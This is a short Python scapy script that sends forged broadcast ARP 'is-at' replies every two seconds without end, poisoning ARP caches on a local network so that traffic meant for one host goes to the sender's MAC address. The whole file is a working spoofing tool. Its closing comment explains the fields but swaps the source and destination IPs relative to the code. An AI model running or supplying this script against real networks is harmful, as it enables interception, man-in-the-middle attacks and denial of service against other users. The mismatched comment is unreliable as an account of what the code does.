#!/usr/bin/env python

from scapy.all import *
import time 

while True:
    try:
        packet = Ether()/ARP(op="is-at", hwdst="ff:ff:ff:ff:ff:ff", hwsrc="00:0c:29:62:03:88", psrc="192.168.91.144", pdst="192.168.91.2")
        sendp(packet)
        print("ARP-packe sent:", packet.summary())
    except Exception as e:
        print(f"Failed: {e}")

    time.sleep(2)

"""
hwdst="ff:ff:ff:ff:ff:ff",  # Destination MAC address - "ff:ff:ff:ff:ff:ff" is a broadcast address, which sends the packet to all devices on the network.
hwsrc="00:0c:29:62:03:88",  # Source MAC address - This is the MAC address of the device sending the packet (your machine or a network device).
psrc="192.168.91.2",         # Source IP address - This is the IP address of the device sending the packet.
pdst="192.168.91.144"        # Destination IP address - This is the IP address of the device the packet is intended for.

"""